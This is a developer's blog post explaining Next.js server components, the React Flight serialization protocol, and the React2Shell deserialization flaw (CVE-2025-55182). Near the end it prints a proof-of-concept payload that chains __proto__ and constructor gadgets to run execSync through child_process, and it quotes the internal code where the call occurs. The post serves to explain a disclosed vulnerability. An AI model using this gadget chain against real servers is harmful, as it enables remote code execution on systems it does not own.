I’m currently building an app using Next.js ( dmarcdefender.io). I’m not sure how I feel about it. It’s both amazing and terrifying, seamlessly jumping between client-side/server-side code. I don’t really like magic, but it is nice having one single environment, one set of types, complete DRY on both the client/server side, and SSR/SSG for free.

Part of the magic is the Flight Protocol. If you’ve ever inspected the network tab of a Next.js app, you’ve probably seen some goobilie goop:

That doesn’t look like a REST API! RSC (React Server Components) was also recently vulnerable to a nasty exploit called React2Shell.

Background

Server Components vs Client Components

(My background is Next.JS, so I’m just going to speak/research from the Next.JS side of things.)

We have client components (traditional react), and new server components. Client components can use the client APIs that give web pages their interactivity, things like useEffect and useState. Server components give you a way to write react-esce code that is instead rendered on the server. The downside is you don’t get to use interactive APIs like useEffect and useState, but you can do backend stuff, like querying a database, authN/authZ, etc. Then when you need interactivity, you can just embed a client component within the server component.

Next.JS is pretty magical is the handoff between server components to client components. When a request is made to a server component that has a client component, both the server component and the client component are rendered server side, then the client component is hydrated client side. So you get the best of both worlds. It even goes further with caching and suspense.. With caching, if you have content that doesn’t change much but is dynamically generated (blog posts from a CMS/database), it can be built on deployment or cached using a variety of mechanicms have static page load times. With suspense, you can send a client part of the web page, and when parts in the suspense boundary are complete (i.e. expensive database aggregation), it’ll be streamed in later.

Flight Protocol

The Flight protocol is the protocol used for serializing the react trees and props from the server to the client, along with server function calls. The flight protocol is used instead of just serializing JSON for more advance types. Things like Dates/Sets, promises, binary data, references to other server actions, and circular references.

A great resource for understanding the protocol was this blog post: https://overreacted.io/introducing-rsc-explorer/.

But the individual messages of the Flight protocol look like:

0:["$","p",null,{"children":"I am some text!"}]

So it’s just chunks of react objects and state to be rendered. One note is that client components aren’t necessarily transmitted in the Flight Protocol, technically they’re loaded as part of the bundler like normal client components.

To implement streaming, placeholders are inserted, (type “reference”), that are then replaced later when the Stream API sends them.

CVE-2025-55182

React2Shell was a serialization bug. A good background can be found here. Using some tricks, it’s possible to get a handle to constructor, and then using some gadgets, you can pass arbitrary input.

{
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"process.mainModule.require('child_process').execSync('calc');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },             
}

This is the internal object gadget where the call actually occurs:

case "B":
  return (
    (obj = parseInt(value.slice(2), 16)),
    response._formData.get(response._prefix + obj)
  );

So response._formData.get is the constructor function, and response._prefix is the payload.
